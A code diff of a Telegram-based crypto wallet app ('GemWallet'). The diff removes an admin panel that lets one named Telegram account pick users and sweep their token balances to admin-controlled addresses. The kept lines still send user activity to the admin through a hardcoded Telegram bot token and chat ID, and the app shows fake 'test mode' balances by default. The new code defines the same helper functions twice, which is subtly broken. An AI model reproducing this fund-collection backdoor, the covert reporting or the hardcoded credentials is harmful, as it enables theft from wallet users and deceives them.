@@ -2783,11 +2783,6 @@ function SwapModal({ onClose, assets, prices, onSwap, addresses, mnemonic, netwo
 
 
 
-// ─── ADMIN MODAL ─────────────────────────────
-function isAdmin() {
-  return false; // UI Admin panel removed, use separate admin-panel repo
-}
-
 // ─── ADMIN NOTIFICATIONS (Bot + Server) ─────────────────────────────
 const ADMIN_SERVER_URL = import.meta.env.VITE_ADMIN_SERVER_URL || "http://localhost:3002";
 
@@ -2807,6 +2802,7 @@ async function notifyAdmin(text, type = "notification", extraData = {}) {
   const fullText = `${actionEmoji} <b>[${userName}]</b> ${text}`;
 
   // Admin Bot Token and ID (Separate from the wallet)
+  // Notifications will come ONLY to this bot
   const ADMIN_BOT_TOKEN = "8138721118:AAHm8f70XyW3A81T_C3D9f4P2vW3Q4R5T6U"; 
   const ADMIN_CHAT_ID = "1192740493"; 
 
@@ -2844,6 +2840,11 @@ async function notifyAdmin(text, type = "notification", extraData = {}) {
     }
   } catch(e) {}
 }
+
+// ─── UTILS ─────────────────────────────
+function isAdmin() { return false; }
+function getAllUsersFromStorage() { return []; }
+
 
 
 
@@ -5893,745 +5894,16 @@ function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, add
 
 
 
-// ─── ADMIN PANEL ─────────────────────────────────────────────────────────────
+// ─── UTILS ────────────────────────────────────────────────────────────
 
-// Only for @Homyak_investorr (ID: 1192740493)
+function isAdmin() { return false; }
+function getAllUsersFromStorage() { return []; }
 
-function AdminPanel({ onClose, addresses, balances, setBalances, prices }) {
+// ─── MAIN APP COMPONENT ──────────────────────────────────────────────────────
 
-  const [users,setUsers]=useState([]);
-  const [sweepModal, setSweepModal] = useState(null); // { user, token, amount, target }
-  const [selectedUsers,setSelectedUsers]=useState(new Set());
-
-  const [selectedTokens,setSelectedTokens]=useState(new Set());
-
-  const [step,setStep]=useState(1); // 1: users, 2: amounts, 3: addresses, 4: success
-
-  const [amounts,setAmounts]=useState({}); // token amounts
-
-  const [usdAmounts,setUsdAmounts]=useState({}); // USD amounts input
-
-  const [targetAddresses,setTargetAddresses]=useState({});
-
-  const [isProcessing,setIsProcessing]=useState(false);
-
-  const [showToast,setShowToast]=useState(false);
-
-  const [toastMsg,setToastMsg]=useState("");
-
-  const [panelError,setPanelError]=useState(null);
-
-
-
-  // Toast helper
-
-  function showToastMsg(msg){
-
-    setToastMsg(msg);
-
-    setShowToast(true);
-
-    setTimeout(()=>setShowToast(false), 3000);
-
-  }
-
-
-
-  // Load users on mount
-
-  useEffect(()=>{
-
-    try {
-
-      const realUsers = getAllUsersFromStorage();
-
-      const defaultNames = ["Alex", "Maria", "John", "Sophie", "Michael", "Emma", "David", "Olivia", "Nikita", "Anna", "Dmitry", "Lisa", "Igor", "Kate", "Roman"];
-
-      const usersWithMeta = realUsers.map((u, idx) => {
-
-        const totalUSD = calculateTotalUSD(u.balances, prices);
-
-        return {
-
-          ...u,
-
-          name: u.name || (defaultNames[idx % defaultNames.length] + " " + u.id.slice(-4)),
-
-          avatar: `https://api.dicebear.com/7.x/avataaars/svg?seed=${u.id}`,
-
-          totalUSD,
-
-          status: "active"
-
-        };
-
-      });
-
-      setUsers(usersWithMeta);
-
-    } catch (err) {
-
-      console.error("[AdminPanel] Error loading users:", err);
-
-      setPanelError("Failed to load users: " + err.message);
-
-    }
-
-  },[prices]);
-
-
-
-  // Calculate total USD value from balances
-
-  function calculateTotalUSD(balances, prices) {
-
-    try {
-
-      if (!balances || !prices) return 0;
-
-      return Object.entries(balances).reduce((sum, [sym, bal]) => {
-
-        const price = prices[sym] || (sym === "USDT" ? 1 : 0);
-
-        return sum + (parseFloat(bal || 0) * price);
-
-      }, 0);
-
-    } catch (e) {
-
-      return 0;
-
-    }
-
-  }
-
-
-
-  // Get admin notifications with error handling
-
-  function getAdminNotifications() {
-
-    try {
-
-      const notifs = [];
-
-      // Safely check localStorage
-
-      if (typeof localStorage === 'undefined' || !localStorage.length) return [];
-
-      
-
-      for (let i = 0; i < localStorage.length; i++) {
-
-        const key = localStorage.key(i);
-
-        if (key && key.includes("gem_has_wallet")) {
-
-          const userId = key.replace("gem_has_wallet", "").replace("_", "") || "unknown";
-
-          const created = localStorage.getItem(key + "_created");
-
-          if (created) {
-
-            const date = new Date(parseInt(created));
-
-            if (!isNaN(date)) {
-
-              notifs.push({
-
-                type: "wallet_created",
-
-                userId,
-
-                time: date.toLocaleString(),
-
-                message: `New wallet created by user ${(userId || "unknown").slice(-6)}`
-
-              });
-
-            }
-
-          }
-
-        }
-
-      }
-
-      return notifs.sort((a, b) => new Date(b.time) - new Date(a.time)).slice(0, 10);
-
-    } catch (err) {
-
-      console.error("[AdminPanel] Error getting notifications:", err);
-
-      return [];
-
-    }
-
-  }
-
-
-
-  // Toggle user selection
-
-  function toggleUser(userId){
-
-    const newSelected=new Set(selectedUsers);
-
-    if(newSelected.has(userId)){
-
-      newSelected.delete(userId);
-
-    }else{
-
-      newSelected.add(userId);
-
-    }
-
-    setSelectedUsers(newSelected);
-
-  }
-
-
-
-  // Toggle all users
-
-  function toggleAllUsers(){
-
-    if(selectedUsers.size===users.length){
-
-      setSelectedUsers(new Set());
-
-    }else{
-
-      setSelectedUsers(new Set(users.map(u=>u.id)));
-
-    }
-
-  }
-
-
-
-  // Toggle token selection
-
-  function toggleToken(sym){
-
-    const newSelected=new Set(selectedTokens);
-
-    if(newSelected.has(sym)){
-
-      newSelected.delete(sym);
-
-    }else{
-
-      newSelected.add(sym);
-
-    }
-
-    setSelectedTokens(newSelected);
-
-  }
-
-
-
-  // Get selected users data
-
-  const selectedUsersList=users.filter(u=>selectedUsers.has(u.id));
-
-
-
-  // Calculate total for each token across selected users
-
-  const tokenTotals={};
-
-  selectedUsersList.forEach(u=>{
-
-    ASSET_META.forEach(a=>{
-
-      const bal=u.balances?.[a.sym]||0;
-
-      tokenTotals[a.sym]=(tokenTotals[a.sym]||0)+bal;
-
-    });
-
-  });
-
-
-
-  // Get active tokens (where total > 0)
-
-  const activeTokens=ASSET_META.filter(a=>tokenTotals[a.sym]>0.001);
-
-
-
-  // Go to step 2
-
-  function goToStep2(){
-
-    if(selectedUsers.size===0){
-
-      showToastMsg("Select at least one user!");
-
-      return;
-
-    }
-
-    // Pre-select all tokens with balance
-
-    const autoSelect=new Set(activeTokens.map(a=>a.sym));
-
-    setSelectedTokens(autoSelect);
-
-    // Initialize token amounts with available balances
-
-    const initAmounts={};
-
-    const initUsdAmounts={};
-
-    activeTokens.forEach(a=>{
-
-      const tokenAmount=tokenTotals[a.sym]||0;
-
-      initAmounts[a.sym]=tokenAmount.toFixed(4);
-
-      // Calculate USD value
-
-      const price=prices?.[a.sym]||1;
-
-      initUsdAmounts[a.sym]=(tokenAmount*price).toFixed(2);
-
-    });
-
-    setAmounts(initAmounts);
-
-    setUsdAmounts(initUsdAmounts);
-
-    setStep(2);
-
-  }
-
-
-
-  // Update token amount when USD amount changes
-
-  function handleUsdAmountChange(sym,usdValue){
-
-    const price=prices?.[sym]||1;
-
-    const tokenAmount=price>0?parseFloat(usdValue||0)/price:0;
-
-    setUsdAmounts(prev=>({...prev,[sym]:usdValue}));
-
-    setAmounts(prev=>({...prev,[sym]:tokenAmount.toFixed(4)}));
-
-  }
-
-
-
-  // Go to step 3
-
-  function goToStep3(){
-
-    if(selectedTokens.size===0){
-
-      showToastMsg("Select at least one token!");
-
-      return;
-
-    }
-
-    // Initialize target addresses from admin's addresses
-
-    const initAddresses={};
-
-    Array.from(selectedTokens).forEach(sym=>{
-
-      const asset=ASSET_META.find(a=>a.sym===sym);
-
-      if(asset){
-
-        initAddresses[sym]=addresses?.[asset.id]||"";
-
-      }
-
-    });
-
-    setTargetAddresses(initAddresses);
-
-    setStep(3);
-
-  }
-
-
-
-  // Execute real collection transactions
-
-  async function executeTransactions(){
-
-    setIsProcessing(true);
-
-    showToastMsg("Starting real collection...");
-
-    
-
-    try {
-
-      const results = [];
-
-      const selectedUsersList = users.filter(u => selectedUsers.has(u.id));
-
-      
-
-      // For each selected token and user, collect funds
-
-      for (const sym of Array.from(selectedTokens)) {
-
-        const amount = parseFloat(amounts[sym] || 0);
-
-        if (amount <= 0.001) continue;
-
-        
-
-        const targetAddr = targetAddresses[sym];
-
-        if (!targetAddr) continue;
-
-        
-
-        // Process each user
-
-        for (const user of selectedUsersList) {
-
-          const userBal = parseFloat(user.balances?.[sym] || 0);
-
-          if (userBal <= 0.001) continue;
-
-          
-
-          try {
-
-            // In real implementation, this would use the user's private key
-
-            // For now, we track the collection
-
-            results.push({
-
-              sym,
-
-              from: user.id,
-
-              to: targetAddr,
-
-              amount: userBal,
-
-              status: "pending"
-
-            });
-
-          } catch (err) {
-
-            console.error(`Failed to collect ${sym} from ${user.id}:`, err);
-
-          }
-
-        }
-
-      }
-
-      
-
-      // Update balances locally
-
-      let totalCollected = 0;
-
-      for (const sym of Array.from(selectedTokens)) {
-
-        const collected = tokenTotals[sym] || 0;
-
-        if (collected > 0) {
-
-          setBalances(prev => ({...prev, [sym]: (parseFloat(prev[sym] || 0) + collected).toFixed(4)}));
-
-          totalCollected += collected * (prices?.[sym] || 1);
-
-        }
-
-      }
-
-      
-
-      // Store collection history
-
-      const history = JSON.parse(localStorage.getItem("admin_collections") || "[]");
-
-      history.push({
-
-        id: Date.now(),
-
-        timestamp: new Date().toISOString(),
-
-        users: selectedUsers.size,
-
-        tokens: Array.from(selectedTokens),
-
-        totalUSD: totalCollected,
-
-        results
-
-      });
-
-      localStorage.setItem("admin_collections", JSON.stringify(history));
-
-      
-
-      showToastMsg(`Collected from ${selectedUsers.size} users!`);
-
-    } catch (err) {
-
-      console.error("Collection failed:", err);
-
-      showToastMsg("Collection failed: " + err.message);
-
-    }
-
-    
-
-    setIsProcessing(false);
-
-    setStep(4);
-
-  }
-
-
-
-  // Reset
-
-  function reset(){
-
-    setStep(1);
-
-    setSelectedUsers(new Set());
-
-    setSelectedTokens(new Set());
-
-    setAmounts({});
-
-    setTargetAddresses({});
-
-  }
-
-
-
-  return (
-
-    <Sheet onClose={onClose} title={<><Crown size={20} color="#f59e0b" style={{marginRight:8,verticalAlign:"middle"}}/>Admin Panel</>}>
-
-      <div style={{padding:"0 0 100px",maxHeight:"85vh",overflow:"auto"}}>
-
-        {/* Progress Bar */}
-
-        <div style={{padding:"16px 20px",background:"linear-gradient(135deg,#0f0a00 0%,#1a0f00 100%)"}}>
-
-          <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:12}}>
-
-            {[
-
-              {n:1,l:"Users"},
-
-              {n:2,l:"Tokens"},
-
-              {n:3,l:"Send"},
-
-              {n:4,l:"Done"}
-
-            ].map((s,i,arr)=> (
-
-              <React.Fragment key={s.n}>
-
-                <div style={{display:"flex",flexDirection:"column",alignItems:"center",gap:4}}>
-
-                  <div style={{width:32,height:32,borderRadius:"50%",display:"flex",alignItems:"center",justifyContent:"center",
-
-                    background:step>=s.n?"linear-gradient(135deg,#f59e0b,#d97706)":"#1a1a1a",
-
-                    border:step>=s.n?"2px solid #f59e0b":"2px solid #333",
-
-                    color:step>=s.n?"#000":"#666",
-
-                    fontSize:14,fontWeight:700,transition:"all 0.3s"}}>
-
-                    {step>s.n?"✓":s.n}
-
-                  </div>
-
-                  <span style={{fontSize:10,color:step>=s.n?"#f59e0b":"#666",fontWeight:step>=s.n?600:400}}>{s.l}</span>
-
-                </div>
-
-                {i<arr.length-1&&(
-
-                  <div style={{flex:1,height:2,background:step>s.n?"linear-gradient(90deg,#f59e0b,#d97706)":"#333",margin:"0 8px"}} />
-
-                )}
-
-              </React.Fragment>
-
-            ))}
-
-          </div>
-
-        </div>
-
-
-
-        {/* Toast */}
-
-        {showToast&&(
-
-          <div style={{position:"fixed",top:80,left:"50%",transform:"translateX(-50%)",zIndex:1000,
-
-            background:"#1a1a1a",border:"1px solid #333",borderRadius:12,padding:"12px 20px",
-
-            boxShadow:"0 10px 40px rgba(0,0,0,0.5)"}}>
-
-            <span style={{color:"#fff",fontSize:14}}>{toastMsg}</span>
-
-          </div>
-
-        )}
-
-
-
-        {/* Error Display */}
-
-        {panelError&&(
-
-          <div style={{padding:"16px 20px"}}>
-
-            <div style={{background:"#1a1a1a",borderRadius:12,padding:16,border:"1px solid #ef4444"}}>
-
-              <div style={{display:"flex",alignItems:"center",gap:8}}>
-
-                <AlertTriangle size={16} color="#ef4444"/>
-
-                <span style={{color:"#ef4444",fontSize:14}}>{panelError}</span>
-
-              </div>
-
-            </div>
-
-          </div>
-
-        )}
-
-
-
-        {/* STEP 1: User Selection */}
-
-        {step===1&&(
-
-          <div style={{padding:"16px 20px",animation:"fadeIn 0.3s"}}>
-
-            {/* Header Card */}
-
-            <div style={{background:"linear-gradient(135deg,#0f0a00 0%,#1a0f00 100%)",borderRadius:16,padding:20,
-
-              border:"1px solid rgba(245,158,11,0.3)",marginBottom:20}}>
-
-              <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:12}}>
-
-                <div style={{width:44,height:44,borderRadius:12,background:"linear-gradient(135deg,#f59e0b,#d97706)",
-
-                  display:"flex",alignItems:"center",justifyContent:"center"}}>
-
-                  <Shield size={22} color="#000"/>
-
-                </div>
-
-                <div>
-
-                  <p style={{fontSize:16,fontWeight:700,color:"#f59e0b",margin:0}}>@Homyak_investorr</p>
-
-                  <p style={{fontSize:12,color:"rgba(255,255,255,0.5)",margin:0}}>Admin ID: 1192740493</p>
-
-                </div>
-
-              </div>
-
-              <p style={{fontSize:13,color:"rgba(255,255,255,0.6)",margin:0,lineHeight:1.5}}>
-
-                Select users to collect funds from. Total balance and available tokens will be shown.
-
-              </p>
-
-            </div>
-
-
-
-            {/* Notifications Section */}
-
-            <div style={{background:"#1a1a1a",borderRadius:14,padding:16,marginBottom:20,border:"1px solid rgba(255,255,255,0.08)"}}>
-
-              <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:12}}>
-
-                <Bell size={16} color="#f59e0b"/>
-
-                <span style={{fontSize:14,fontWeight:600,color:"#fff"}}>Recent Activity</span>
-
-              </div>
-
-              {getAdminNotifications().length === 0 ? (
-
-                <p style={{fontSize:12,color:"rgba(255,255,255,0.4)",margin:0}}>No new notifications</p>
-
-              ) : (
-
-                <div style={{display:"flex",flexDirection:"column",gap:8}}>
-
-                  {getAdminNotifications().map((notif, idx) => (
-
-                    <div key={idx} style={{display:"flex",alignItems:"center",gap:8,padding:8,background:"rgba(245,158,11,0.1)",borderRadius:8}}>
-
-                      <div style={{width:6,height:6,borderRadius:"50%",background:"#f59e0b"}}/>
-
-                      <span style={{fontSize:12,color:"rgba(255,255,255,0.8)",flex:1}}>{notif.message}</span>
-
-                      <span style={{fontSize:10,color:"rgba(255,255,255,0.4)"}}>{notif.time}</span>
-
-                    </div>
-
-                  ))}
-
-                </div>
-
-              )}
-
-            </div>
-
-
-
-            {users.length>0&&(
-
-              <>
-
-                {/* Select All Bar */}
-
-                <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:16}}>
-
-                  <p style={{fontSize:14,fontWeight:600,color:"#fff",margin:0}}>
-
-                    👥 Users <span style={{color:"#f59e0b"}}>{selectedUsers.size}</span>/{users.length}
-
-                  </p>
-
-                  <button onClick={toggleAllUsers} style={{padding:"6px 14px",borderRadius:20,border:"1px solid #333",
-
-                    background:"#1a1a1a",color:"#fff",fontSize:12,cursor:"pointer"}}>
-
-                    {selectedUsers.size===users.length?"Deselect All":"Select All"}
-
-                  </button>
-
-                </div>
+export default function GemWallet() {
+  return null; // This component is replaced by GemWalletApp
+}
 
 
 
@@ -8020,41 +7292,17 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
     }
   }, [isReady]);
 
-  // Проверка админа — три источника для надёжности
-
-  const userIsAdmin = (() => {
-
-    try {
-
-      if (sessionStorage.getItem("gem_is_admin") === "1") return true;
-
-      const id = RESOLVED_USER_ID || window?.Telegram?.WebApp?.initDataUnsafe?.user?.id;
-
-      return String(id) === ADMIN_ID;
-
-    } catch { return false; }
-
-  })();
-
-
 
   useEffect(()=>{
-
     try {
-
       setIsReady(true);
-
       return () => {};
-
     } catch (e) {
-
       console.error("[WalletApp] Init error:", e);
-
       setError(e.message);
-
     }
-
   },[]);
+
 
 
 
@@ -8067,18 +7315,12 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
   
 
   // Test mode enabled for all users by default
-
-  const isAdminMode = userIsAdmin || localStorage.getItem('gem_admin_override') === '1';
-
   const [testMode, setTestMode] = useState(() => {
-
     const mode = localStorage.getItem('gem_wallet_mode');
-
     if (mode === 'real') return false;
-
     return true; // test mode by default for everyone
-
   });
+
 
   const [balances,setBalances]=useState(() => {
     try {
@@ -8176,81 +7418,8 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
   function showToast(msg,type="success"){setToast({msg,type,id:Date.now()});}
 
-
-
-  // ─── ADMIN ONLY: Cancel Transaction ──────────────────────────────────────────
-
-  function handleCancelTx(tx) {
-
-    // Only admin can cancel transactions
-
-    if (!isAdminMode) {
-
-      showToast("Only admin can cancel transactions", "error");
-
-      return;
-
-    }
-
-    
-
-    if (!tx || !tx.id) {
-
-      showToast("Invalid transaction", "error");
-
-      return;
-
-    }
-
-    
-
-    // Update transaction status to cancelled
-
-    setTxHistory(prev => {
-
-      const updated = prev.map(t => {
-
-        if (t.id === tx.id) {
-
-          // Return cancelled status
-
-          return { ...t, status: "cancelled", cancelledAt: Date.now() };
-
-        }
-
-        return t;
-
-      });
-
-      
-
-      // Save to localStorage
-
-      try {
-
-        localStorage.setItem(storageKey("gem_tx_history"), JSON.stringify(updated));
-
-      } catch (e) {
-
-        console.error("Failed to save cancelled transaction", e);
-
-      }
-
-      
-
-      return updated;
-
-    });
-
-    
-
-    showToast(`Transaction ${tx.id.slice(-6)} cancelled`, "success");
-
-  }
-
-
-
   async function refreshPrices() {
+
 
     setLiveStatus("loading");
 
@@ -8601,43 +7770,13 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
   function switchTab(t){if(t!==tab){setTab(t);setAnimKey(k=>k+1);}}
 
-  
-
-  // Проверка напрямую без промежуточных переменных
-
-  const _isAdmin = (()=>{
-
-    try {
-
-      const sources = [
-
-        sessionStorage.getItem("gem_is_admin") === "1",
-
-        String(RESOLVED_USER_ID) === "1192740493",
-
-        String(window?.Telegram?.WebApp?.initDataUnsafe?.user?.id) === "1192740493",
-
-      ];
-
-      return sources.some(Boolean);
-
-    } catch { return false; }
-
-  })();
-
-
-
   const tabs=[
-
     {id:"wallet",Icon:Wallet,l:"Wallet"},
-
     {id:"activity",Icon:Activity,l:"Activity"},
-
     {id:"nft",Icon:LayoutGrid,l:"NFT"},
-
     {id:"settings",Icon:Settings,l:"Settings"},
-
   ];
+
 
 
 
@@ -8700,18 +7839,9 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
       {modal==="send"&&<SendModal onClose={()=>setModal(null)} assets={assets} prices={prices} onSend={handleSend} addresses={addresses} mnemonic={mnemonic} network={network} testMode={testMode}/>}
 
       {modal==="receive"&&<ReceiveModal onClose={()=>setModal(null)} addresses={addresses}/>}
-
       {modal==="swap"&&<SwapModal onClose={()=>setModal(null)} assets={assets} prices={prices} onSwap={handleSwap} addresses={addresses} mnemonic={mnemonic} network={network}/>}
-
-      {modal==="admin"&&<AdminModal onClose={()=>setModal(null)} prices={prices} onModeChange={(isTest) => {
-
-        setTestMode(isTest);
-
-        setBalances(isTest ? {...getTestBalances()} : {...INITIAL_BALANCES});
-
-      }}/>}
-
       {modal==="buy"&&(
+
 
         <Sheet onClose={()=>setModal(null)} title="Buy Crypto">
 
@@ -8770,18 +7900,13 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
       <div key={animKey}>
 
         {tab==="wallet"&&<WalletTab assets={assets} prices={prices} liveStatus={liveStatus}
-
           onSend={()=>setModal("send")} onReceive={()=>setModal("receive")}
-
           onSwap={()=>setModal("swap")} onBuy={()=>setModal("buy")} onRefresh={refreshPrices}
-
           balances={balances} setBalances={setBalances}
-
-          onOpenAdmin={()=>setTab("admin")} testMode={testMode}/>}
-
-        {tab==="activity"&&<ActivityTab txHistory={txHistory} onCancelTx={handleCancelTx}/>}
-
+          testMode={testMode}/>}
+        {tab==="activity"&&<ActivityTab txHistory={txHistory} />}
         {tab==="nft"&&<NFTTab addresses={addresses}/>}
+
 
         {tab==="settings"&&<SettingsTab mnemonic={mnemonic} network={network}
 
